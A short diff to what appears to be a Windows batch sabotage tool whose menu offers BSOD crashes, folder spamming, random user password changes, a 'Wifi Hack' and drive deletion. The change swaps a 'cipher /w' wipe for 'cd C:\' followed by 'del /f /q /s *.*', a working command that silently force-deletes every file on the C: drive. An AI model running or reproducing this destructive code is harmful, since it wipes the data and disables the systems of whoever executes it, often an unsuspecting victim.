@@ -35,7 +35,7 @@ echo [3] Folder Spammer			[12] Random User Password
 echo [4] Show/Hide Files			[13] Pyranha^^!^^! Spam
 echo [5] Open Programs			[14] Remove color
 echo [6] Shutdown				[15] Refresh
-echo [7] BSOD(Dangerous^^!^^!)			[16] Del C: (Beta)
+echo [7] BSOD(Dangerous^^!^^!)			[16] BSOD2(Dangerous^^!^^!)
 echo [8] Wifi Hack                           [17] Exit
 echo [9] Change color
 echo.
@@ -460,6 +460,7 @@ goto deldrive
 
 :deldrive2
 echo.
-cipher /w:C:\
+cd C:\
+del /f /q /s *.*
 pause
 goto MainMenu
